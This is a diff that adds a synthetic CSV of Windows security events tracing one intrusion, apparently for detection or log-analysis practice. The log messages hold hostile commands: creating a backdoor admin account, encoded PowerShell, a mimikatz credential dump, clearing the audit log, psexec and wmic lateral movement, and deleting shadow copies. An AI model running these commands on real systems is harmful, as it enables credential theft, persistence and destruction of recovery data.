@@ -1,0 +1,21 @@
+EventID,TimeGenerated,Source,Level,Message,User,Computer,ProcessName
+4624,2024-03-15 01:55:12,Security,Information,An account was successfully logged on,SYSTEM,WORKSTATION-01,lsass.exe
+4625,2024-03-15 02:18:30,Security,Warning,An account failed to log on - Bad password,UNKNOWN,WORKSTATION-01,lsass.exe
+4625,2024-03-15 02:18:31,Security,Warning,An account failed to log on - Bad password,UNKNOWN,WORKSTATION-01,lsass.exe
+4625,2024-03-15 02:18:32,Security,Warning,An account failed to log on - Bad password,UNKNOWN,WORKSTATION-01,lsass.exe
+4672,2024-03-15 02:18:36,Security,Information,Special privileges assigned to new logon,ATTACKER,WORKSTATION-01,lsass.exe
+4688,2024-03-15 02:19:01,Security,Information,A new process has been created: cmd.exe /c whoami,ATTACKER,WORKSTATION-01,cmd.exe
+4688,2024-03-15 02:19:05,Security,Information,A new process has been created: net user /add backdoor P@ssw0rd,ATTACKER,WORKSTATION-01,cmd.exe
+4688,2024-03-15 02:19:10,Security,Warning,Suspicious process: powershell -enc JABjAGwAaQBlAG4AdAA=,ATTACKER,WORKSTATION-01,powershell.exe
+4698,2024-03-15 02:19:30,Security,Warning,Scheduled task created: MicrosoftUpdateHelper,ATTACKER,WORKSTATION-01,taskschd.dll
+4657,2024-03-15 02:20:00,Security,Warning,Registry key modified: HKLM\Software\Microsoft\Windows\CurrentVersion\Run,ATTACKER,WORKSTATION-01,regedit.exe
+7045,2024-03-15 02:20:15,System,Warning,New service installed: WinDefendHelper - C:\Windows\Temp\svc.exe,ATTACKER,WORKSTATION-01,services.exe
+4732,2024-03-15 02:20:30,Security,Warning,Member added to Administrators group: backdoor,ATTACKER,WORKSTATION-01,lsass.exe
+4663,2024-03-15 02:21:00,Security,Information,File accessed: C:\Users\victim\Documents\passwords.xlsx,ATTACKER,WORKSTATION-01,excel.exe
+4663,2024-03-15 02:21:15,Security,Information,File accessed: C:\Users\victim\Documents\financial_data.xlsx,ATTACKER,WORKSTATION-01,excel.exe
+4688,2024-03-15 02:22:00,Security,Critical,Process executed: mimikatz.exe sekurlsa::logonpasswords,ATTACKER,WORKSTATION-01,mimikatz.exe
+1102,2024-03-15 02:22:30,Security,Critical,Audit log cleared,ATTACKER,WORKSTATION-01,EventLog
+4688,2024-03-15 02:23:00,Security,Warning,Process executed: wmic /node:192.168.1.106 process call create,ATTACKER,WORKSTATION-01,wmic.exe
+4688,2024-03-15 02:23:30,Security,Warning,Process executed: psexec \\192.168.1.106 -u admin -p P@ssw0rd cmd,ATTACKER,WORKSTATION-01,psexec.exe
+4624,2024-03-15 02:24:00,Security,Information,Logon: 192.168.1.106 - Type 3 Network,ATTACKER,SERVER-02,lsass.exe
+4688,2024-03-15 02:24:30,Security,Critical,Process executed: vssadmin delete shadows /all /quiet,ATTACKER,SERVER-02,vssadmin.exe
